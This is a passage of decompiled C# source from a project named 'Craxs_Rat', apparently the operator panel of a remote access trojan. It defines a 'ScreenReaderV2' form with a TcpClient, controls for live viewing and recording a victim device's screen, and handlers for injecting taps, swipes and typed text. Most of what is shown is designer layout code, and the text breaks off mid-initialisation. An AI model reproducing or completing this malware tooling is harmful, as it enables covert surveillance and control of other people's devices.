using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Craxs_Rat.My;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class ScreenReaderV2 : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[CompilerGenerated]
	[AccessedThroughProperty("disablebtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _disablebtn;

	[AccessedThroughProperty("enablebtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _enablebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[AccessedThroughProperty("presstimer")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _presstimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Save")]
	private DrakeUICheckBox _Save;

	[AccessedThroughProperty("savetimer")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _savetimer;

	[AccessedThroughProperty("viewpic")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private PictureBox _viewpic;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("hidetoolbtn")]
	private DrakeUIButtonIcon _hidetoolbtn;

	private bool isclick;

	private bool Swaping;

	private bool isdown;

	private List<Point> Trakpoint;

	public TcpClient Client;

	public Client ScreenClass;

	public Client classClient;

	public string DownloadsFolder;

	public string RecordName;

	public Size ScreenSize;

	public bool LIVE;

	public bool ScreenShotFoucs;

	public bool Recordit;

	public int Rnew;

	public string Title;

	private int tiks;

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon disablebtn
	{
		[CompilerGenerated]
		get
		{
			return _disablebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Disablebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_disablebtn = value;
			drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon enablebtn
	{
		[CompilerGenerated]
		get
		{
			return _enablebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Enablebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _enablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_enablebtn = value;
			drakeUIButtonIcon = _enablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ctrlpanel")]
	internal virtual Panel ctrlpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon3_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon3 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon4_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon4 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon4;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual Timer presstimer
	{
		[CompilerGenerated]
		get
		{
			return _presstimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Presstimer_Tick;
			Timer timer = _presstimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_presstimer = value;
			timer = _presstimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal virtual DrakeUIToolTip DrakeUIToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox Save
	{
		[CompilerGenerated]
		get
		{
			return _Save;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Save_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _Save;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_Save = value;
			drakeUICheckBox = _Save;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	internal virtual Timer savetimer
	{
		[CompilerGenerated]
		get
		{
			return _savetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Savetimer_Tick;
			Timer timer = _savetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_savetimer = value;
			timer = _savetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("activetext")]
	internal virtual Label activetext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox viewpic
	{
		[CompilerGenerated]
		get
		{
			return _viewpic;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = PictureBox1_MouseDown;
			MouseEventHandler value3 = Viewpic_MouseMove;
			MouseEventHandler value4 = Viewpic_MouseUp;
			PictureBox pictureBox = _viewpic;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
				pictureBox.MouseMove -= value3;
				pictureBox.MouseUp -= value4;
			}
			_viewpic = value;
			pictureBox = _viewpic;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
				pictureBox.MouseMove += value3;
				pictureBox.MouseUp += value4;
			}
		}
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clinameinfo")]
	internal virtual Label clinameinfo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ClientPic")]
	internal virtual PictureBox ClientPic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("keyboardpanel")]
	internal virtual Panel keyboardpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("buttompanel")]
	internal virtual Panel buttompanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("textsend")]
	internal virtual DrakeUITextBox textsend
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar2_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar2 = value;
			drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon hidetoolbtn
	{
		[CompilerGenerated]
		get
		{
			return _hidetoolbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Hidetoolbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _hidetoolbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_hidetoolbtn = value;
			drakeUIButtonIcon = _hidetoolbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.activetext = new System.Windows.Forms.Label();
		this.Save = new DrakeUI.Framework.DrakeUICheckBox();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.disablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.enablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.ctrlpanel = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.presstimer = new System.Windows.Forms.Timer(this.components);
		this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
		this.hidetoolbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.savetimer = new System.Windows.Forms.Timer(this.components);
		this.viewpic = new System.Windows.Forms.PictureBox();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Panel3 = new System.Windows.Forms.Panel();
		this.clinameinfo = new System.Windows.Forms.Label();
		this.ClientPic = new System.Windows.Forms.PictureBox();
		this.keyboardpanel = new System.Windows.Forms.Panel();
		this.textsend = new DrakeUI.Framework.DrakeUITextBox();
		this.buttompanel = new System.Windows.Forms.Panel();
		this.Panel2.SuspendLayout();
		this.ctrlpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viewpic).BeginInit();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
		this.keyboardpanel.SuspendLayout();
		this.buttompanel.SuspendLayout();
		base.SuspendLayout();
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.activetext);
		this.Panel2.Controls.Add(this.Save);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon2);
		this.Panel2.Controls.Add(this.disablebtn);
		this.Panel2.Controls.Add(this.enablebtn);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 29);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(388, 38);
		this.Panel2.TabIndex = 1;
		this.activetext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.activetext.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.activetext.ForeColor = System.Drawing.Color.SkyBlue;
		this.activetext.Location = new System.Drawing.Point(105, 0);
		this.activetext.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.activetext.Name = "activetext";
		this.activetext.Size = new System.Drawing.Size(205, 38);
		this.activetext.TabIndex = 24;
		this.activetext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Save.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.Save.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Save.Dock = System.Windows.Forms.DockStyle.Right;
		this.Save.Font = new System.Drawing.Font("Calibri", 10f);
		this.Save.ForeColor = System.Drawing.Color.SkyBlue;
		this.Save.Location = new System.Drawing.Point(310, 0);
		this.Save.Name = "Save";
		this.Save.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.Save.Size = new System.Drawing.Size(78, 38);
		this.Save.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Save.StyleCustomMode = true;
		this.Save.TabIndex = 23;
		this.Save.Text = "Record";
		this.Save.TextAlign = System.Drawing.ContentAlignment.TopLeft;
		this.DrakeUIToolTip1.SetToolTip(this.Save, "Record Screen");
		this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon2.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(70, 0);
		this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
		this.DrakeUIButtonIcon2.Radius = 25;
		this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(35, 38);
		this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon2.Symbol = 57469;
		this.DrakeUIButtonIcon2.TabIndex = 22;
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon2, "Clear");
		this.disablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.disablebtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.disablebtn.FillColor = System.Drawing.Color.Black;
		this.disablebtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.disablebtn.FillPressColor = System.Drawing.Color.Black;
		this.disablebtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.disablebtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.Location = new System.Drawing.Point(35, 0);
		this.disablebtn.Name = "disablebtn";
		this.disablebtn.Radius = 25;
		this.disablebtn.RectColor = System.Drawing.Color.SkyBlue;
		this.disablebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.disablebtn.RectHoverColor = System.Drawing.Color.White;
		this.disablebtn.RectPressColor = System.Drawing.Color.White;
		this.disablebtn.RectSelectedColor = System.Drawing.Color.White;
		this.disablebtn.Size = new System.Drawing.Size(35, 38);
		this.disablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.disablebtn.Symbol = 61534;
		this.disablebtn.TabIndex = 21;
		this.DrakeUIToolTip1.SetToolTip(this.disablebtn, "Stop");
		this.enablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.enablebtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.enablebtn.FillColor = System.Drawing.Color.Black;
		this.enablebtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.enablebtn.FillPressColor = System.Drawing.Color.Black;
		this.enablebtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.enablebtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.Location = new System.Drawing.Point(0, 0);
		this.enablebtn.Name = "enablebtn";
		this.enablebtn.Radius = 25;
		this.enablebtn.RectColor = System.Drawing.Color.SkyBlue;
		this.enablebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.enablebtn.RectHoverColor = System.Drawing.Color.White;
		this.enablebtn.RectPressColor = System.Drawing.Color.White;
		this.enablebtn.RectSelectedColor = System.Drawing.Color.White;
		this.enablebtn.Size = new System.Drawing.Size(35, 38);
		this.enablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.enablebtn.Symbol = 61671;
		this.enablebtn.TabIndex = 20;
		this.DrakeUIToolTip1.SetToolTip(this.enablebtn, "Start");
		this.ctrlpanel.BackColor = System.Drawing.Color.Black;
		this.ctrlpanel.Controls.Add(this.DrakeUIButtonIcon1);
		this.ctrlpanel.Controls.Add(this.DrakeUIButtonIcon4);
		this.ctrlpanel.Controls.Add(this.DrakeUIButtonIcon3);
		this.ctrlpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ctrlpanel.Location = new System.Drawing.Point(0, 0);
		this.ctrlpanel.Name = "ctrlpanel";
		this.ctrlpanel.Size = new System.Drawing.Size(388, 28);
		this.ctrlpanel.TabIndex = 2;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(129, 0);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.Radius = 10;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(130, 28);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 57353;
		this.DrakeUIButtonIcon1.TabIndex = 22;
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon1, "Home");
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(259, 0);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.Radius = 10;
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(129, 28);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.Symbol = 61524;
		this.DrakeUIButtonIcon4.TabIndex = 23;
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon4, "Return");
		this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon3.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon3.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon3.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon3.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
		this.DrakeUIButtonIcon3.Radius = 10;
		this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon3.RectHoverColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon3.RectPressColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon3.RectSelectedColor = System.Drawing.Color.White;
		this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(129, 28);
		this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon3.Symbol = 61641;
		this.DrakeUIButtonIcon3.SymbolSize = 20;
		this.DrakeUIButtonIcon3.TabIndex = 21;
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIButtonIcon3, "Recent");
		this.presstimer.Interval = 1000;
		this.DrakeUIToolTip1.BackColor = System.Drawing.Color.Black;
		this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIToolTip1.OwnerDraw = true;
		this.DrakeUIToolTip1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar2.AvatarSize = 45;
		this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar2.Location = new System.Drawing.Point(354, 0);
		this.DrakeUIAvatar2.Margin = new System.Windows.Forms.Padding(2);
		this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
		this.DrakeUIAvatar2.Size = new System.Drawing.Size(34, 28);
		this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar2.Symbol = 61912;
		this.DrakeUIAvatar2.SymbolSize = 25;
		this.DrakeUIAvatar2.TabIndex = 47;
		this.DrakeUIAvatar2.Text = "DrakeUIAvatar2";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Send");
		this.hidetoolbtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.hidetoolbtn.BackColor = System.Drawing.Color.Transparent;
		this.hidetoolbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.hidetoolbtn.FillColor = System.Drawing.Color.Transparent;
		this.hidetoolbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.hidetoolbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.hidetoolbtn.Location = new System.Drawing.Point(354, 619);
		this.hidetoolbtn.Margin = new System.Windows.Forms.Padding(2);
		this.hidetoolbtn.Name = "hidetoolbtn";
		this.hidetoolbtn.RectColor = System.Drawing.Color.Transparent;
		this.hidetoolbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.hidetoolbtn.Size = new System.Drawing.Size(26, 19);
		this.hidetoolbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.hidetoolbtn.Symbol = 61504;
		this.hidetoolbtn.SymbolSize = 30;
		this.hidetoolbtn.TabIndex = 9;
		this.hidetoolbtn.TagString = "s";
		this.DrakeUIToolTip1.SetToolTip(this.hidetoolbtn, "Hide/Show Tools");
		this.savetimer.Interval = 1000;
		this.viewpic.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewpic.Location = new System.Drawing.Point(0, 67);
		this.viewpic.Margin = new System.Windows.Forms.Padding(2);
		this.viewpic.Name = "viewpic";
		this.viewpic.Size = new System.Drawing.Size(388, 603);
		this.viewpic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.viewpic.TabIndex = 3;
		this.viewpic.TabStop = false;
		this.Panel3.BackColor = System.Drawing.Color.Black;
		this.Panel3.Controls.Add(this.clinameinfo);
		this.Panel3.Controls.Add(this.ClientPic);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel3.Location = new System.Drawing.Point(0, 0);
		this.Panel3.Margin = new System.Windows.Forms.Padding(2);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(388, 29);
		this.Panel3.TabIndex = 6;
